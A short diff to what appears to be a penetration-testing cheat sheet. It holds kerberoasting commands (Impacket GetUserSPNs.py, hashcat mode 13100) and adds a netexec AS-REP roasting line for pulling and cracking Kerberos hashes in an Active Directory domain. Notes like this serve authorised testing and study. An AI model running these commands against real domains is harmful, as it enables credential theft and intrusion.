@@ -3,3 +3,5 @@ When you have valid domain creds try kerberoasting to get user hashes, you do no
 GetUserSPNs.py DOMAIN/username:password -dc-ip <DC_IP> OR GetUserSPNs.py DOMAIN/username -hashes :<NTLM> -dc-ip <DC_IP>
 
 hashcat -m 13100 spn_hashes.txt wordlist.txt
+
+netexec kerberos <target_ip> -u users.txt --asreproast
